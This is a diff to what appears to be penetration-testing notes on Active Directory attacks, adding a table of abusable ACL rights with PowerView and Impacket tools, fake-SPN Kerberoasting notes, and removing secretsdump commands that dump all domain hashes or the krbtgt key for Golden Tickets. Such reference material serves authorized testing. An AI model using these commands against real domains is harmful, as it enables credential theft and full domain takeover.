@@ -426,6 +426,21 @@ raiseChild.py -target-exec <DC_IP> <TARGET_DOMAIN>/<USER>
 - `AllExtendedRights` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
 - `AddSelf` abused with `Add-DomainGroupMember`
 
+| ACL                                     | Abuse                                                                    | Impact                             |
+| --------------------------------------- | ------------------------------------------------------------------------ | ---------------------------------- |
+| `DCSync` (`GetChanges`+`GetChangesAll`) | `lsadump::dcsync` / `secretsdump`                                        | Dump all domain hashes — game over |
+| `GenericAll`                            | `Set-DomainUserPassword` / `Add-DomainGroupMember` / RBCD / Shadow Creds | Full control over object           |
+| `AllExtendedRights`                     | `Set-DomainUserPassword` / `Add-DomainGroupMember` / DCSync              | Extended rights bundle             |
+| `WriteDACL`                             | `Add-DomainObjectACL` → grant self GenericAll                            | Escalates to GenericAll            |
+| `WriteOwner`                            | `Set-DomainObjectOwner` → WriteDACL → GenericAll                         | Escalates to GenericAll            |
+| `Owns`                                  | `Set-DomainObjectOwner` → WriteDACL chain                                | Same as WriteOwner                 |
+| `ReadLAPSPassword`                      | `Get-DomainComputer -Properties ms-mcs-AdmPwd`                           | Instant local admin                |
+| `ReadGMSAPassword`                      | `gMSADumper.py`                                                          | Service account takeover           |
+| `GenericWrite`                          | `Set-DomainObject` / Targeted Kerberoast / Shadow Creds / Logon script   | Partial control                    |
+| `ForceChangePassword`                   | `Set-DomainUserPassword`                                                 | Password reset without old pass    |
+| `AddMembers`                            | `Add-DomainGroupMember`                                                  | Add self to privileged group       |
+| `AddSelf`                               | `Add-DomainGroupMember`                                                  | Add self to one group only         |
+
 ### Top ACL Attacks
 
 - [ForceChangePassword](https://bloodhound.specterops.io/resources/edges/force-change-password#forcechangepassword) - gives us the right to reset a user's password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords).
@@ -611,9 +626,13 @@ One must have 1 of the following:
 | **AES-128**     | `19600`      | `$krb5tgs$17$*` | Type 17 encrypted ticket.                                   |
 | **AES-256**     | `19700`      | `$krb5tgs$18$*` | Sometimes received. Type 18 encrypted ticket.               |
 
-#### Create Fake SPN
+#### Create Fake SPN via PowerView
 
 Create a fake SPN to Kerberoast a user. This will require proper enumeration and a vector to have the right privileges.
+
+`SPN_NAME` format: `serviceclass/host[:port]`: e.g. `MSSQLSvc/sql01.domain.local:1433`
+
+**First import PowerView:**
 
 {{< embed-section page="Docs/6 - Post-Exploitation/nice-commands" header="via-powerview" >}}
 
@@ -754,29 +773,9 @@ $sid = Convert-NameToSid <USER>
 Get-ObjectAcl "DC=<DOMAIN>,DC=<TOPLEVEL_DOMAIN>" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
 ```
 
-### Attack via Impacket
+### Attack via netexec
 
-Remember this user must have the permissions stated above.
-
-*   **`-just-dc-ntlm`**: Extract only NTLM hashes (skips Kerberos keys).
-*   **`-just-dc-user <USERNAME>`**: Extract data for a specific user only.
-*   **`-pwd-last-set`**: Display when the account's password was last changed.
-*   **`-history`**: Dump password history (useful for cracking patterns).
-*   **`-user-status`**: Display if the account is Enabled or Disabled.
-
-```bash
-# NOISY: Dump All
-impacket-secretsdump -outputfile dcsync_hashes -just-dc <DOMAIN>/<USER>:<PASSWORD>@<TARGET>
-
-# QUIETER: dump krbtgt for Golden Tickets
-impacket-secretsdump -outputfile dcsync_hashes -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<TARGET>
-```
-
-| Output Files          | `secretsdump`  Content                                                                                                                                                                                                                                                                          | Primary Use Case                                                                        |
-| :-------------------- | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | :-------------------------------------------------------------------------------------- |
-| **`.ntds`**           | **NTLM Hashes**. <br>Format: `User:RID:LM:NT:::`.                                                                                                                                                                                                                                               | **Pass-the-Hash**, Offline Cracking (Hashcat Mode 1000).                                |
-| **`.ntds.kerberos`**  | **Kerberos Keys** (AES-256, AES-128, DES).                                                                                                                                                                                                                                                      | **Golden Tickets** (requires `krbtgt` AES key), **Pass-the-Key** (if NTLM is disabled). |
-| **`.ntds.cleartext`** | **[Plaintext Passwords](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption)**. <br>Only appears for users with "Store password using reversible encryption" enabled. | **Direct Login** (RDP, WinRM). Rare but critical finding.                               |
+{{< embed-section page="Docs/9 - Notes/netexec" header="ntds-extraction" >}}
 
 ### Attack via mimikatz
 
